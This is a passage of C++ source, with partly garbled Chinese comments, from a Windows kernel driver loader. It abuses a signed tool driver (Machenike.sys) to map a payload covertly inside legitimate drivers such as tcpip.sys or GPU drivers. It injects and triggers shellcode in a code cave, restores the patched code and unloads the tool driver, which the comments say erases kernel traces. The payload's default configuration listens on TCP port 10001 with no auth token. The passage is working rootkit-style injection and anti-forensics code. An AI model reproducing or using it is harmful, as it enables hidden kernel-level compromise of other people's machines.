        CloseHandle(hDev);
        return false;
    }

    // ---- 9.1 å®ä½å®¿ä¸»ç½ç»é©±å¨ï¼ä¼åä½¿ç¨ tcpip.sys è¿è¡å°¾é¨æ©å±ææ¥ï¼----
    uint64_t hostDrvBase = triggerDrvBase;
    uint32_t hostDrvSize = triggerDrvSize;
    uint32_t hostOrigSize = triggerDrvSize;
    uint64_t hostLdrEntryVA = triggerLdrEntryVA;
    const wchar_t* actualHostName = triggerDrvName;
    std::vector<uint8_t> cleanHostHdr;

    // 优选宿主探测序列：系统网络 tcpip(2.9MB) -> AMD 显卡(数十MB) -> NVIDIA 显卡(109MB)
    const wchar_t* candidateHosts[] = {
        (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) ? preferredHostDrvName : L"tcpip.sys",
        L"amdkmdag.sys",
        L"nvlddmkm.sys"
    };

    const wchar_t* chosenHostName = nullptr;
    uint64_t prefBase = 0;
    uint32_t prefSize = 0;
    uint64_t prefLdrVA = 0;
    bool foundPref = false;

    for (const wchar_t* cand : candidateHosts) {
        if (!cand || wcslen(cand) == 0 || _wcsicmp(cand, triggerDrvName) == 0) continue;
        if (psLoadedModList != 0) {
            foundPref = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList, cand, prefBase, prefSize, prefLdrVA);
        }
        if (!foundPref) {
            foundPref = FindWhqlModuleViaPsapi(cand, prefBase, prefSize);
        }
        if (foundPref) {
            chosenHostName = cand;
            LOG_OK("LoadDrvWsk: Selected optimal host driver '%ls' (Base=0x%016llX, OrigSize=0x%X)",
                   chosenHostName, prefBase, prefSize);
            break;
        }
    }

    // ---- 9.2 新方案：payload + pdata 整体写入宿主内部，零 ExAllocatePool / RtlAddFunctionTable ----
    uint64_t payloadKernVA   = 0;   // drv_wsk 在宿主内部的内核 VA（直接传给 shellcode）
    uint32_t pdataRVA        = 0;   // 合并 pdata 在宿主内的 RVA
    uint32_t pdataTotalSize  = 0;

    if (foundPref && chosenHostName) {
        uint32_t newHostSize = 0;
        // ApplyRelocation 在 InjectPayloadAndPdataIntoHost 内部执行（需要先知道目标 VA）
        // 所以这里的 img 在进入时尚未做 reloc（ErasePEHeader 已抹除 MZ，reloc 数据在 .reloc 节，不受影响）
        if (InjectPayloadAndPdataIntoHost(
                hDev, cr3, prefBase, prefSize, prefLdrVA,
                chosenHostName, img, newHostSize, cleanHostHdr,
                payloadKernVA, pdataRVA, pdataTotalSize,
                ntoskrnlBase, triggerDrvBase, triggerDrvSize,
                &site, caveVA))
        {
            hostDrvBase    = prefBase;
            hostDrvSize    = newHostSize;   // SizeOfImage 不变，payload 写在内部
            hostOrigSize   = prefSize;
            hostLdrEntryVA = prefLdrVA;
            actualHostName = chosenHostName;
            LOG_OK("LoadDrvWsk: [Plan A PTE Remap] payload embedded inside '%ls' at KernVA=0x%016llX",
                   actualHostName, payloadKernVA);
        } else {
            LOG_WARN("LoadDrvWsk: InjectPayloadAndPdataIntoHost failed, falling back to ExAllocatePool path");
            payloadKernVA = 0;  // 回退：shellcode 自己 ExAllocatePool
        }
    } else {
        LOG_WARN("LoadDrvWsk: No optimal host driver found, falling back to trigger driver '%ls'",
                 triggerDrvName);
    }

    // ---- 10. æå»º ShellcodeParams ----
    InjectContext ctx = {};
    ctx.hDev               = hDev;
    ctx.cr3                = cr3;
    ctx.ntoskrnlBase       = ntoskrnlBase;
    ctx.psLoadedModuleList = psLoadedModList;
    ctx.whqlDrvBase        = hostDrvBase;
    ctx.whqlDrvSize        = hostDrvSize;
    ctx.whqlLdrEntryVA     = hostLdrEntryVA;  // fakeDriverObj.DriverSection
    ctx.pImg               = &img;
    // 若已预写入宿主内部，userImageVA 指向内核 VA（shellcode 跳过 ExAllocatePool+MmCopyMemory）
    // 若回退路径，userImageVA 仍指向用户态 VirtualLock 页，shellcode 走 MmCopyMemory 旧路径
    ctx.userImageVA        = (payloadKernVA != 0) ? payloadKernVA : userImageVA;
    ctx.hookReturnVA       = site.kernVA + 5;
    if (pBootConfig) {
        ctx.bootConfig = *pBootConfig;
    } else {
        ctx.bootConfig.Magic         = DRV_BOOT_MAGIC;
        ctx.bootConfig.TransportMode = DRV_TRANSPORT_TCP;
        ctx.bootConfig.Port          = 10001;
        ctx.bootConfig.AuthToken     = 0;
        ctx.bootConfig.Flags         = 0;
    }

    ShellcodeParams params = {};
    if (!BuildShellcodeParams(ctx, params)) {
        LOG_ERR("LoadDrvWsk: BuildShellcodeParams failed");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 11. æ³¨å¥ Shellcode ----
    bool injectOk = false;
    if (payloadKernVA != 0) {
        LOG_INFO("LoadDrvWsk: Using direct execution shellcode (Plan A / PTE Remap path)");
        injectOk = InjectShellcodeFull(hDev, cr3, site, caveVA, params, scDirectExec, scDirectExec_size);
    } else {
        injectOk = InjectShellcodeFull(hDev, cr3, site, caveVA, params);
    }
    if (!injectOk) {
        LOG_ERR("LoadDrvWsk: InjectShellcodeFull failed");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 12. è§¦å default åæ¯æ§è¡ Shellcodeï¼åæ ¸çº¿ç¨ååæ­¥æ§è¡ï¼----
    LOG_INFO("LoadDrvWsk: Triggering WHQL default branch via %ls...", triggerDrvName);
    uint32_t gle = 0;
    bool ioOk = WhqlTrigger(hDev, &gle);

    // ---- 13. æ¢å¤ WHQL default åæ¯åå§æä»¤å¹¶æ¸ç Code Cave ----
    RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, totalPayloadSize);

    // è§£éç¨æ·æåå­
    VirtualUnlock(img.Image.data(), img.Image.size());

    if (!ioOk) {
        LOG_ERR("LoadDrvWsk: Shellcode execution failed or returned error (GLE=%u)", gle);
        CloseHandle(hDev);
        return false;
    }

    CloseHandle(hDev);
    hDev = INVALID_HANDLE_VALUE;

    // ---- 核心驱动一旦启动成功，立即卸载 Machenike.sys 抹除内核痕迹 ----
    LOG_INFO("LoadDrvWsk: Core driver running successfully, unloading Machenike.sys tool driver...");
    UnloadWhqlDriver(L"Machenike");

    LOG_OK("LoadDrvWsk: drv_wsk mapped and initialized successfully (Host: %ls, Size: 0x%X)!",
           actualHostName, hostDrvSize);
    return true;
}

// 别名包装，明确 ManualMapCave 模式语义
static inline bool LoadDrvWskViaCave(
    const wchar_t*        drvWskPath,
    const wchar_t*        triggerDrvName       = L"Machenike.sys",
    const wchar_t*        preferredHostDrvName = nullptr,
    bool                  forceReload          = false,
    const DRV_BOOT_CONFIG* pBootConfig         = nullptr)
{
    return LoadDrvWsk(drvWskPath, triggerDrvName, preferredHostDrvName, forceReload, pBootConfig);
}
